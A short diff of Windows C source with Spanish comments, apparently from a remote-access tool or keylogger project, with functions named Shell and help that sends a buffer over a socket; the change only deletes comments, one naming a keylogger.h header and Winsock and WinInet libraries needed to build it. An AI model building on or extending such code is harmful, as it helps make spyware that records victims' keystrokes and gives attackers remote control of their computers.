@@ -152,7 +152,7 @@ void help() {
     ssize_t bytesSent = send(sock, buffer, sizeof(buffer), 0);
     if (bytesSent == -1) {
         perror("Error al enviar datos a través del socket");
-        // Puedes agregar lógica adicional en caso de error
+        
     }
 }
 
@@ -242,8 +242,6 @@ void Shell() {
     }
 }
 
-// Asegúrate de tener la biblioteca keylogger.h y las bibliotecas requeridas en el código 
-// (stdio.h, stdlib.h, unistd.h, winsock2.h, windows.h, winuser.h, wininet.h, windowsx.h, string.h, sys/stat.h, sys/types.h) antes de compilar y ejecutar el código.
 
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int cNmdShow) {
